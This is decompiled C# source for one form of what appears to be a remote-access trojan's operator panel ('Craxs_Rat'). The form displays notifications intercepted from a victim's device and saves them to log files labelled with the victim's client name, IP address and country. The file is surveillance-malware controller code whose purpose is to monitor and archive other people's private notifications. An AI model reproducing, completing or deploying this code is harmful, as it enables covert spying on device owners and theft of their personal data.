using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x02000028 RID: 40
	[DesignerGenerated]
	public partial class craxsnotification : Form
	{
		// Token: 0x06000246 RID: 582 RVA: 0x000126D0 File Offset: 0x000108D0
		public craxsnotification()
		{
			base.Load += this.craxsnotification_Load;
			base.Deactivate += this.craxsnotification_Deactivate;
			this.InitializeComponent();
		}

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x06000249 RID: 585 RVA: 0x0000241D File Offset: 0x0000061D
		// (set) Token: 0x0600024A RID: 586 RVA: 0x00012F68 File Offset: 0x00011168
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170000D2 RID: 210
		// (get) Token: 0x0600024B RID: 587 RVA: 0x00002425 File Offset: 0x00000625
		// (set) Token: 0x0600024C RID: 588 RVA: 0x00012F7C File Offset: 0x0001117C
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x170000D3 RID: 211
		// (get) Token: 0x0600024D RID: 589 RVA: 0x0000242D File Offset: 0x0000062D
		// (set) Token: 0x0600024E RID: 590 RVA: 0x00012F90 File Offset: 0x00011190
		internal virtual Panel Panel3 { get; set; }

		// Token: 0x170000D4 RID: 212
		// (get) Token: 0x0600024F RID: 591 RVA: 0x00002435 File Offset: 0x00000635
		// (set) Token: 0x06000250 RID: 592 RVA: 0x00012FA4 File Offset: 0x000111A4
		internal virtual Panel Panel4 { get; set; }

		// Token: 0x170000D5 RID: 213
		// (get) Token: 0x06000251 RID: 593 RVA: 0x0000243D File Offset: 0x0000063D
		// (set) Token: 0x06000252 RID: 594 RVA: 0x00012FB8 File Offset: 0x000111B8
		internal virtual Panel Panel5 { get; set; }

		// Token: 0x170000D6 RID: 214
		// (get) Token: 0x06000253 RID: 595 RVA: 0x00002445 File Offset: 0x00000645
		// (set) Token: 0x06000254 RID: 596 RVA: 0x00012FCC File Offset: 0x000111CC
		internal virtual TextBox notifitext { get; set; }

		// Token: 0x170000D7 RID: 215
		// (get) Token: 0x06000255 RID: 597 RVA: 0x0000244D File Offset: 0x0000064D
		// (set) Token: 0x06000256 RID: 598 RVA: 0x00012FE0 File Offset: 0x000111E0
		internal virtual DrakeUIButtonIcon checkbutton
		{
			[CompilerGenerated]
			get
			{
				return this._checkbutton;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.checkbutton_Click);
				DrakeUIButtonIcon checkbutton = this._checkbutton;
				if (checkbutton != null)
				{
					checkbutton.Click -= value2;
				}
				this._checkbutton = value;
				checkbutton = this._checkbutton;
				if (checkbutton != null)
				{
					checkbutton.Click += value2;
				}
			}
		}

		// Token: 0x170000D8 RID: 216
		// (get) Token: 0x06000257 RID: 599 RVA: 0x00002455 File Offset: 0x00000655
		// (set) Token: 0x06000258 RID: 600 RVA: 0x00013024 File Offset: 0x00011224
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170000DA RID: 218
		// (get) Token: 0x06000259 RID: 601 RVA: 0x0000245D File Offset: 0x0000065D
		// (set) Token: 0x0600025A RID: 602 RVA: 0x00013068 File Offset: 0x00011268
		internal virtual DrakeUIToolTip ToolTips { get; set; }

		// Token: 0x170000D9 RID: 217
		// (get) Token: 0x0600025B RID: 603 RVA: 0x00002465 File Offset: 0x00000665
		// (set) Token: 0x0600025C RID: 604 RVA: 0x0001307C File Offset: 0x0001127C
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon2_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon2 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x0600025D RID: 605 RVA: 0x000130C0 File Offset: 0x000112C0
		private void craxsnotification_Load(object sender, EventArgs e)
		{
			base.Location = new Point(checked(Cursor.Position.X - 79), Cursor.Position.Y);
			this.BackColor = Color.DarkRed;
			base.TransparencyKey = Color.DarkRed;
			if (this.gclass8_0 != null)
			{
				if (this.gclass8_0.strings_1.Count<string>() > 0)
				{
					this.notifitext.Text = "Notifications Monitor...\r\n";
					foreach (string text in this.gclass8_0.strings_1)
					{
						try
						{
							if (text != null && text.Length > 0)
							{
								TextBox notifitext;
								(notifitext = this.notifitext).Text = notifitext.Text + text + "\r\n--------------------";
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				else
				{
					TextBox notifitext;
					(notifitext = this.notifitext).Text = notifitext.Text + "No Notifications ...";
				}
			}
			this.gclass8_0.bool_9 = false;
		}

		// Token: 0x0600025E RID: 606 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600025F RID: 607 RVA: 0x00011540 File Offset: 0x0000F740
		private void craxsnotification_Deactivate(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000260 RID: 608 RVA: 0x000131E0 File Offset: 0x000113E0
		private void checkbutton_Click(object sender, EventArgs e)
		{
			this.notifitext.Text = "";
			this.gclass8_0.strings_1 = new string[251];
			base.Close();
		}

		// Token: 0x06000261 RID: 609 RVA: 0x00011540 File Offset: 0x0000F740
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000262 RID: 610 RVA: 0x00013218 File Offset: 0x00011418
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.notifitext.Text))
			{
				Alert.ShowInformation("No log found to save");
			}
			else
			{
				try
				{
					if (!Directory.Exists(this.gclass8_0.string_10 + "\\Notificatios"))
					{
						Directory.CreateDirectory(this.gclass8_0.string_10 + "\\Notificatios");
					}
					string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
					if (!File.Exists(this.gclass8_0.string_10 + "\\Notificatios\\" + text))
					{
						File.Create(this.gclass8_0.string_10 + "\\Notificatios\\" + text).Dispose();
						File.AppendAllText(this.gclass8_0.string_10 + "\\Notificatios\\" + text, string.Concat(new string[]
						{
							"Client Name: ",
							this.gclass8_0.string_8,
							"\r\nClient IP: ",
							this.gclass8_0.string_1,
							"\r\nCountry: ",
							this.gclass8_0.string_6,
							"\r\nDate :",
							DateTime.Now.ToString(),
							"\r\n----------------------------------------\r\n"
						}));
					}
					File.AppendAllText(this.gclass8_0.string_10 + "\\Notificatios\\" + text, text + this.notifitext.Text + "\r\n");
					Process.Start(this.gclass8_0.string_10 + "\\Notificatios");
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0400009D RID: 157
		public GClass8 gclass8_0;
	}
}
